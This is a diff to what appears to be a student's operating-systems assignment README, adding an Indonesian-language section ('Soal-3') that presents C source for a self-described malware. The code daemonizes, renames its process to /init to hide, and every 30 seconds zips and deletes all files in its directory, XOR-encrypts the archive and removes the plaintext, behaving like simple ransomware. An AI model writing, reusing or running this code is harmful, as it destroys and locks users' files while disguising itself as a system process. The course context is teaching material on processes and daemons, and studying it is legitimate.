@@ -201,6 +201,97 @@ Done sir ^^
 
 ## Soal-2
 ## Soal-3
+Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init.
+```
+// Rename proses ke /init
+void rename_process(int argc, char *argv[], const char *new_name) {
+    strncpy(argv[0], new_name, strlen(argv[0]));
+    for (int i = 1; i < argc; i++) {
+        memset(argv[i], 0, strlen(argv[i]));
+    }
+}
+
+// XOR Enkripsi file
+void xor_encrypt(const char *filepath, const char *outpath, unsigned char key, time_t t) {
+    FILE *in = fopen(filepath, "rb");
+    FILE *out = fopen(outpath, "wb");
+    if (!in || !out) return;
+
+    int ch;
+    while ((ch = fgetc(in)) != EOF) {
+        fputc(ch ^ key ^ (t % 256), out);
+    }
+
+    fclose(in);
+    fclose(out);
+}
+
+// Fungsi utama anak orphan
+void zip_and_encrypt(const char *self_name) {
+    time_t now = time(NULL);
+    char zip_name[256], enc_name[256];
+    sprintf(zip_name, "backup_%ld.zip", now);
+    sprintf(enc_name, "backup_%ld.enc", now);
+
+    pid_t pid = fork();
+    if (pid == 0) {
+        // Proses anak untuk menjalankan zip dengan execvp
+        char *args[] = {
+            "zip", "-rm", zip_name, "*", "-x", (char *)self_name, NULL
+        };
+        execvp("zip", args);
+        exit(EXIT_FAILURE); // Kalau exec gagal
+    } else if (pid > 0) {
+        wait(NULL); // Tunggu sampai zip selesai
+    } else {
+        return; // Fork gagal
+    }
+
+    xor_encrypt(zip_name, enc_name, KEY, now);
+    remove(zip_name);
+}
+
+int main(int argc, char *argv[]) {
+    pid_t pid, sid;
+
+    pid = fork();
+    if (pid < 0) exit(EXIT_FAILURE);
+    if (pid > 0) exit(EXIT_SUCCESS); // Parent pertama keluar
+
+    umask(0);
+    sid = setsid();
+    if (sid < 0) exit(EXIT_FAILURE);
+    if ((chdir(".")) < 0) exit(EXIT_FAILURE); // Gunakan current directory
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    rename_process(argc, argv, "/init");
+
+    // Fork kedua → buat child orphan
+    pid_t child_pid = fork();
+    if (child_pid < 0) exit(EXIT_FAILURE);
+    if (child_pid > 0) exit(EXIT_SUCCESS); // Parent keluar → child orphan
+
+    // Orphan child
+    char self_path[256];
+    readlink("/proc/self/exe", self_path, sizeof(self_path));
+    self_path[sizeof(self_path) - 1] = '\0';
+
+    // Ambil hanya nama file dari path-nya
+    char *self_name = strrchr(self_path, '/');
+    self_name = (self_name != NULL) ? self_name + 1 : self_path;
+
+    while (1) {
+        zip_and_encrypt(self_name);
+        sleep(30);
+    }
+
+    return 0;
+}
+
+```
 ## Soal-4
 A. Menampilkan daftar semua proses yang sedang berjalan pada user tersebut beserta PID, command, CPU usage, dan memory usage.
 
